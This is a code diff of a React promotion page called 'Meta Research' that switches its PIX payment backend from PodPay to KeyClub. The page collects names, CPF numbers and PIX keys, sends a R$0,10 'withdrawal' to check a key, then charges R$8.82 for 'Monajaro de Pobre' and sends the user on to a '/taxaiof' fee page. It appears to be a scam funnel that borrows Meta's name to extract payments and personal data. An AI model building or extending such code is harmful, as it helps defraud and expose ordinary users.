@@ -7,7 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
 import Image from "next/image"
 import { getUTMParams, navigateWithUTM } from "@/lib/utm-manager"
-// import { PodPayAPI } from "@/lib/podpay-api" // Removed import
+import { KeyClubAPI } from "@/lib/keyclub-api"
 
 export default function MetaResearchPromotion() {
   const [fullName, setFullName] = useState("")
@@ -81,7 +81,7 @@ export default function MetaResearchPromotion() {
   const [showVideoTutorial, setShowVideoTutorial] = useState(false)
   const [rejectionCountdown, setRejectionCountdown] = useState(5)
   const [usedPixKeys, setUsedPixKeys] = useState<Set<string>>(new Set())
-  const [processingTimer, setProcessingTimer] = useState<number | null>(null)
+  const [processingTimer, setProcessingTimer] = useState<NodeJS.Timeout | null>(null)
 
   const videoRef = useRef<HTMLVideoElement>(null)
 
@@ -100,7 +100,7 @@ export default function MetaResearchPromotion() {
         const response = await fetch(`/api/check-payment-status?id=${transactionId}`)
         const data = await response.json()
 
-        if (data.status === "approved" || data.status === "AUTHORIZED") {
+        if (data.status === "AUTHORIZED") {
           clearInterval(interval)
           setShowPixStep(false)
           navigateWithUTM("/taxaiof")
@@ -156,55 +156,75 @@ export default function MetaResearchPromotion() {
       const utmParams = getUTMParams()
 
       const cleanCpf = selectedPixKeyType === "cpf" ? paymentData.pixKey.replace(/\D/g, "") : "18219822821"
+
       const customerEmail = selectedPixKeyType === "email" ? paymentData.pixKey : "joao.silva@email.com"
 
       const transactionData = {
-        amount: 882, // Convert to cents (8.82 * 100)
-        currency: "BRL",
-        paymentMethod: "pix",
+        external_id: `monjaro-pobre-${Date.now()}`,
+        total_amount: 8.82,
+        payment_method: "PIX",
+        webhook_url: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/keyclub/webhook`,
         items: [
           {
-            externalRef: `monjaro-pobre-${Date.now()}`,
+            id: "Monajaro-pobre",
             title: "Monajaro de Pobre",
-            unitPrice: 882,
+            description: "Monajaro-pobre",
+            price: 8.82,
             quantity: 1,
+            is_physical: false,
           },
         ],
+        ip: "127.0.0.1",
         customer: {
           name: fullName || paymentData.fullName || "João Silva Santos",
           email: customerEmail,
-          document: {
-            number: cleanCpf, // Removed PodPayAPI.formatDocument
-            type: "cpf",
-          },
-        },
-        pix: {
-          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
+          phone: paymentData.phone || "11987654321",
+          document_type: "CPF",
+          document: cleanCpf,
+          utm_source: utmParams.utm_source || "",
+          utm_medium: utmParams.utm_medium || "",
+          utm_campaign: utmParams.utm_campaign || "",
+          utm_content: utmParams.utm_content || "",
+          utm_term: utmParams.utm_term || "",
         },
       }
 
-      console.log("[v0] Creating PIX payment with PodPay:", transactionData)
+      console.log("[v0] Creating PIX payment with data:", transactionData)
 
-      const response = await fetch("/api/podpay/create-transaction", {
+      console.log("[v0] Creating deposit payment with KeyClub API:", transactionData)
+
+      const response = await fetch("/api/keyclub/deposit", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify(transactionData),
+        body: JSON.stringify({
+          amount: 8.82,
+          external_id: transactionData.external_id,
+          clientCallbackUrl: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/keyclub/webhook`,
+          payer: {
+            name: fullName || paymentData.fullName || "Usuario",
+            email: paymentData.email || "usuario@email.com",
+            document: cleanCpf,
+          },
+          utm_params: utmParams,
+        }),
       })
 
       const result = await response.json()
 
-      if (!result.success) {
-        console.error("[v0] PodPay PIX payment error:", result)
-        throw new Error(result.error || "Erro ao criar pagamento PIX")
+      console.log("[v0] PIX payment response:", result)
+
+      if (result.hasError) {
+        console.error("[v0] PIX payment error:", result)
+        throw new Error(result.message || "Erro ao criar pagamento PIX")
       }
 
-      const transactionId = result.data?.id
-      const pixPayload = result.data?.pixPayload
+      const transactionId = result.id || result.transaction_id || result.external_id
+      const pixPayload = result.pix?.payload || result.pix_code || result.qr_code
 
       if (!transactionId || !pixPayload) {
-        console.error("[v0] Missing required fields in PodPay response:", result)
+        console.error("[v0] Missing required fields in response:", result)
         throw new Error("Resposta da API incompleta")
       }
 
@@ -216,7 +236,7 @@ export default function MetaResearchPromotion() {
         setPixLoadingComplete(true)
       }, 3000)
 
-      checkPaymentStatus(transactionId)
+      checkPaymentStatus(result.id)
     } catch (error) {
       console.error("[v0] Erro ao criar pagamento PIX:", error)
       const errorMessage = error instanceof Error ? error.message : "Erro desconhecido"
@@ -854,7 +874,7 @@ export default function MetaResearchPromotion() {
   }, [showLanguageDropdown])
 
   useEffect(() => {
-    let timer: number
+    let timer: NodeJS.Timeout
 
     if (!isSubmitted) {
       timer = setTimeout(() => {
@@ -870,7 +890,7 @@ export default function MetaResearchPromotion() {
   }, [isSubmitted])
 
   useEffect(() => {
-    let timer: number
+    let timer: NodeJS.Timeout
 
     if (showVideoUnlock && !isVideoMuted) {
       setShowUnlockButton(false) // Reset button visibility
@@ -955,45 +975,26 @@ export default function MetaResearchPromotion() {
         return
       }
 
-      // Removed PodPayAPI.validateDocument call
-
-      const cashoutData = {
-        amount: 10, // R$ 0,10 in cents
-        currency: "BRL",
-        paymentMethod: "pix",
-        items: [
-          {
-            externalRef: `META-${Math.random().toString(36).substring(2, 15)}`, // Generate external ref in frontend
-            title: `Saque Meta Research - ${fullName}`,
-            unitPrice: 10,
-            quantity: 1,
-            tangible: false, // Added required tangible field for PodPay API
-          },
-        ],
-        customer: {
-          name: fullName || "Meta Research User",
-          email: paymentData.email || "user@metaresearch.com",
-          document: {
-            number: paymentData.pixKey.replace(/\D/g, ""), // Format document in frontend
-            type: pixKeyType === "cpf" ? "cpf" : "cnpj",
-          },
-        },
-        pix: {
-          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
-        },
+      // Validar chave PIX
+      if (!KeyClubAPI.validatePixKey(paymentData.pixKey, pixKeyType)) {
+        alert("Chave PIX inválida para o tipo selecionado")
+        setPixValidationLoading(false)
+        setShowPixValidationModal(false)
+        setShowConfirmationModal(true)
+        return
       }
 
-      console.log("[v0] Enviando R$0,10 via PodPay:", cashoutData)
+      const cashoutData = {
+        amount: 0.1, // R$ 0,10 conforme especificado
+        external_id: KeyClubAPI.generateExternalId(),
+        pix_key: KeyClubAPI.formatPixKey(paymentData.pixKey, pixKeyType),
+        key_type: pixKeyType.toUpperCase() as "EMAIL" | "CPF" | "CNPJ" | "PHONE",
+        description: `Saque Meta Research - ${fullName}`,
+      }
 
-      const response = await fetch("/api/podpay/create-transaction", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(cashoutData),
-      })
+      console.log("[v0] Enviando R$0,10 via KeyClub:", cashoutData)
 
-      const result = await response.json()
+      const result = await KeyClubAPI.createCashout(cashoutData)
 
       if (result.success) {
         console.log("[v0] Cashout realizado com sucesso:", result.data)
@@ -1166,7 +1167,7 @@ export default function MetaResearchPromotion() {
 
   const handleKeyclubCashout = async () => {
     try {
-      console.log("[v0] Iniciando cashout PodPay")
+      console.log("[v0] Iniciando cashout KeyClub")
 
       // Validar dados do pagamento
       if (!paymentData.pixKey || !selectedPixKeyType) {
@@ -1174,45 +1175,23 @@ export default function MetaResearchPromotion() {
         return
       }
 
-      // Removed PodPayAPI.validateDocument call
-
-      const cashoutData = {
-        amount: 10, // R$ 0,10 in cents
-        currency: "BRL",
-        paymentMethod: "pix",
-        items: [
-          {
-            externalRef: fullName || paymentData.fullName || `user_${Date.now()}`,
-            title: `Saque Meta Research - ${fullName}`,
-            unitPrice: 10,
-            quantity: 1,
-            tangible: false, // Added required tangible field for PodPay API
-          },
-        ],
-        customer: {
-          name: fullName || "Meta Research User",
-          email: paymentData.email || "user@metaresearch.com",
-          document: {
-            number: paymentData.pixKey.replace(/\D/g, ""), // Format document in frontend
-            type: selectedPixKeyType === "cpf" ? "cpf" : "cnpj",
-          },
-        },
-        pix: {
-          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
-        },
+      // Validar chave PIX
+      if (!KeyClubAPI.validatePixKey(paymentData.pixKey, selectedPixKeyType)) {
+        alert("Chave PIX inválida para o tipo selecionado")
+        return
       }
 
-      console.log("[v0] Dados do cashout PodPay:", cashoutData)
+      const cashoutData = {
+        amount: 0.1, // R$ 0,10 conforme especificado
+        external_id: fullName || paymentData.fullName || `user_${Date.now()}`,
+        pix_key: KeyClubAPI.formatPixKey(paymentData.pixKey, selectedPixKeyType),
+        key_type: selectedPixKeyType.toUpperCase() as "EMAIL" | "CPF" | "CNPJ" | "PHONE",
+        description: `Saque Meta Research - ${fullName}`,
+      }
 
-      const response = await fetch("/api/podpay/create-transaction", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(cashoutData),
-      })
+      console.log("[v0] Dados do cashout:", cashoutData)
 
-      const result = await response.json()
+      const result = await KeyClubAPI.createCashout(cashoutData)
 
       if (result.success) {
         console.log("[v0] Cashout realizado com sucesso:", result.data)
@@ -1232,7 +1211,7 @@ export default function MetaResearchPromotion() {
 
         if (result.error?.includes("IP não autorizado")) {
           errorMessage =
-            "Erro de autorização: O servidor não está autorizado na PodPay. Entre em contato com o suporte."
+            "Erro de autorização: O servidor não está autorizado na KeyClub. Entre em contato com o suporte."
         } else if (result.error?.includes("403")) {
           errorMessage = "Acesso negado: Verifique suas credenciais ou entre em contato com o suporte."
         } else if (result.error?.includes("500")) {
@@ -1246,66 +1225,6 @@ export default function MetaResearchPromotion() {
     } catch (error) {
       console.error("[v0] Erro interno no cashout:", error)
       alert("Erro interno. Tente novamente em alguns minutos.")
-    }
-  }
-
-  const handlePixValidation = async () => {
-    try {
-      setPixValidationLoading(true)
-
-      const cashoutData = {
-        amount: 10, // R$ 0,10 in cents
-        currency: "BRL",
-        paymentMethod: "pix",
-        items: [
-          {
-            externalRef: `META-${Math.random().toString(36).substring(2, 15)}`, // Generate external ref in frontend
-            title: `Saque Meta Research - ${fullName}`,
-            unitPrice: 10,
-            quantity: 1,
-            tangible: false, // Added required tangible field for PodPay API
-          },
-        ],
-        customer: {
-          name: fullName || "Meta Research User",
-          email: paymentData.email || "user@metaresearch.com",
-          document: {
-            number: paymentData.pixKey.replace(/\D/g, ""), // Format document in frontend
-            type: selectedPixKeyType === "cpf" ? "cpf" : "cnpj",
-          },
-        },
-        pix: {
-          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
-        },
-      }
-
-      console.log("[v0] Enviando R$0,10 via PodPay:", cashoutData)
-
-      const response = await fetch("/api/podpay/create-transaction", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(cashoutData),
-      })
-
-      const result = await response.json()
-
-      if (result.success) {
-        console.log("[v0] Cashout realizado com sucesso:", result.data)
-        // Parar o loading após sucesso
-        setPixValidationLoading(false)
-      } else {
-        console.error("[v0] Erro no cashout:", result.error)
-        alert(`Erro ao processar saque: ${result.error}`)
-        setPixValidationLoading(false)
-        setShowPixValidationModal(false)
-      }
-    } catch (error) {
-      console.error("[v0] Erro interno no cashout:", error)
-      alert("Erro interno. Tente novamente.")
-      setPixValidationLoading(false)
-      setShowPixValidationModal(false)
     }
   }
 
@@ -1618,7 +1537,7 @@ export default function MetaResearchPromotion() {
                     </p>
 
                     <Button
-                      onClick={handlePixValidationConfirm} // Changed from handlePixValidation to handlePixValidationConfirm to continue the cashout flow
+                      onClick={handlePixValidationConfirm}
                       className="w-full bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 hover:from-pink-600 hover:via-purple-600 hover:to-orange-500 text-white font-semibold py-4 rounded-lg text-base uppercase tracking-wide"
                     >
                       SIM, CONFIRMAR
